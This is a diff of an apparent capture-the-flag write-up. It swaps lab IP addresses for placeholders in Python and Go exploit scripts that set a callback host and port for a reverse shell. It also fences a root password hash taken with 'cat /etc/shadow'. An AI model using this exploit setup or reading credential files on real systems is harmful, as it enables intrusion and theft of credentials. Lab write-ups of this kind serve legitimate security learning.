@@ -268,8 +268,9 @@ def rand():
     randChar = ''.join(secrets.choice(alphaNum) for i in range(5)) 
     return randChar
 
-targetIP = "10.10.196.183"
-lhost = "10.2.49.194"
+targetIP = "x.x.x.x"
+# So the remote can beam home to the mothership, set localhost and port...
+lhost = "x.x.x.x"
 lport = "53"
 
 data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
@@ -328,9 +329,9 @@ func randString(length int) string {
 }
 
 func main() {
-	targetIP := "10.10.196.183"
+	targetIP := "x.x.x.x"
 	// localhost and localport so target can talk back to localhost once the exploit is ran.
-	lhost := "10.2.49.194"
+	lhost := "x.x.x.x"
 	lport := "53"
 
 	body := strings.NewReader("page=%2F&user=user1&pass=1user")
@@ -456,6 +457,8 @@ func main() {
 
 **Grab the hashes with cat /etc/shadow**  
 
+```
 root:$6$Fy2Peey/$zKJEi5mOEiUK3geWKtBhspBCkdUr30fhxGSaRPcpXHogR6KYEeFt3cNA4YWfojLP/Jejt8DlD7kmO7Gl32xLC1:18510:0:99999:7:::
+```  
 
 # **Donezo Funzo**
